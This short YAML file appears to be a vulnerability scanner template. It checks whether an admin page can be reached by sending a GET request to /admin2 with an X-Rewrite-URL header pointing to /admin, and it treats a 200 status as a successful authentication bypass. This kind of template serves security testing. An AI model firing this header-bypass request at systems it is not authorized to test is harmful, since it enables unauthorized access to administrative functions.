id: bypass-002
name: 'Header bypass X-Rewrite-URL'
severity: high
type: active
tags:
  - bypass
  - auth
  - headers
description: 'Reaches /admin2 via X-Rewrite-URL'
requests:
  - method: GET
    path: '{{BaseURL}}/admin2'
    sendHeaders:
      X-Rewrite-URL: '/admin'
    matchers:
      - type: status
        status: [200]
